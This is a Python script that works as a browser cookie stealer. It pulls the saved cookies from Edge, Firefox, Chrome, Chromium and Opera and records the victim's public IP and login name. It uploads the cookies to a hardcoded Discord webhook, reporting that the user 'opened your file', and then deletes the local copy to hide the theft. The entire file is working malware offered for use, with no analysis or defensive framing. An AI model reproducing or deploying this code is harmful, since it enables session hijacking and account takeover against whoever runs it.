import os
import requests
import browser_cookie3

webhook_url = "https://discord.com/api/webhooks/1317577535852380190/Ohvb8N1p1p2_NjBp0uBPyfS69mfDjuexsrTzfwB-UwJmFfrS0kBNDbUEypCTonNKLlj9"

def SillyIP():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unknown'

def SillyGrab():
    browsers = {
        "Edge": browser_cookie3.edge,
        "Firefox": browser_cookie3.firefox,
        "Chrome": browser_cookie3.chrome,
        "Chromium": browser_cookie3.chromium,
        "Opera": browser_cookie3.opera
    }

    cookies = []
    for browser_name, browser_function in browsers.items():
        try:
            cj = browser_function()
            for cookie in cj:
                cookies.append(f"{browser_name}\t{cookie.domain}\t{cookie.name}\t{cookie.value}")
        except:
            continue

    return cookies

def hooker(webhook_url, file_path, user_info):
    try:
        with open(file_path, 'rb') as f:
            files = {
                'file': (os.path.basename(file_path), f)
            }
            data = {
                'content': f"**{user_info}** opened your file"
            }
            requests.post(webhook_url, data=data, files=files)
    except:
        pass 

def delete_file(file_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except:
        pass  
def main():
    try:
        username = os.getlogin()
        public_ip = SillyIP()
        user_info = f"{public_ip} | {username}"

        
        cookies = SillyGrab()
        cookies_file_path = "SillyCookies.txt"
        with open(cookies_file_path, 'w', encoding='utf-8') as f:
            f.write("Browser\tDomain\tName\tValue\n")
            f.write("\n".join(cookies))

        # Send to webhook
        hooker(webhook_url, cookies_file_path, user_info)

        # Send user info
        hooker(webhook_url, user_info)

        delete_file(cookies_file_path)
    except:
        delete_file(cookies_file_path)

if __name__ == "__main__":
    main()
